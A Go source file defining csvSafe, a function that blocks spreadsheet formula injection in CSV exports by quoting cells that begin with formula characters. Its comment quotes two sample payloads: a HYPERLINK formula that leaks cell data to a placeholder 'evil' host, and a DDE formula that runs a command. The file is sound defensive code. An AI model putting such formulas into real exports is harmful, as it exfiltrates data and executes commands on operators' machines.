package handler

import "strings"

// csvSafe neutralises spreadsheet formula injection (P4-2). Excel, LibreOffice
// and Google Sheets evaluate a cell that starts with '=', '+', '-' or '@' (and
// treat a leading tab / carriage return as a formula prefix too), so an
// attacker-chosen email or application name such as
// `=HYPERLINK("https://evil/?"&A1,"x")` or `=cmd|'/C calc'!A0` executes when
// an operator opens an export. Prefixing a single quote makes the cell text.
// The check ignores leading whitespace because spreadsheets trim it first.
func csvSafe(s string) string {
	t := strings.TrimLeft(s, " \t\r\n")
	if t == "" {
		return s
	}
	switch t[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + s
	}
	return s
}
